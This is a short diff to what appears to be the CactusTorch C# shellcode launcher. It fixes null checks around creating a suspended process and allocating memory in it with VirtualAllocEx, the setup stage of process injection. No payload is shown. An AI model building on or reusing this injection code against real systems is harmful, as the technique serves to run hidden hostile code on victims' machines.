@@ -236,7 +236,7 @@ public class cactusTorch
         // Create the Process in SUSPENDED state
         IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
         IntPtr hProcess = pInfo.hProcess;
-        if (hProcess.ToString() != "0") { 
+        if (hProcess != IntPtr.Zero) { 
             //MessageBox.Show("hProcess: " + hProcess.ToString("X8"));
             // Use VirtualAllocEx to create some space
 
@@ -244,7 +244,7 @@ public class cactusTorch
 
             //MessageBox.Show("Virtual Alloc: " + spaceAddr.ToString("X8"));
 
-            if (spaceAddr.ToString() == "0")
+            if (spaceAddr == IntPtr.Zero)
             {
                 // TerminateProcess incase failed to Valloc for some reason.
                 TerminateProcess(hProcess, 0);
